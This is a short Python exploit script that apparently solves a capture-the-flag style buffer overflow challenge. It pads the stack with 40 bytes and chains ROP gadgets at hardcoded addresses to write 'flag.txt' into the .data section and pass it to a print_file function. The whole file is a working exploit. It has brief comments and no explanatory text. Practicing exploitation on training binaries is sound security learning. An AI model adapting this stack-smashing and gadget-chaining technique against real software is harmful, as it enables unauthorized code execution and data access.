import sys 
import struct

# --> write is performed at the beginning of the .data section 

def p(a):
    return struct.pack("Q", a)

print_file = 0x0000000000400510
write_address = 0x0000000000601028
# write_address = 0x0000000000601038 also .bss works

gadget1 = 0x0000000000400690 # pop r14; pop r15; ret; 
gadget2 = 0x0000000000400628 # mov %r15, (%r14); ret;
gadget3 = 0x0000000000400693 # pop rdi; ret; 

buf = b"A"*40
buf += p(gadget1)
buf += p(write_address)
buf += b"flag.txt"
buf += p(gadget2)
buf += p(gadget3)
buf += p(write_address)
buf += p(print_file)

sys.stdout.buffer.write(buf)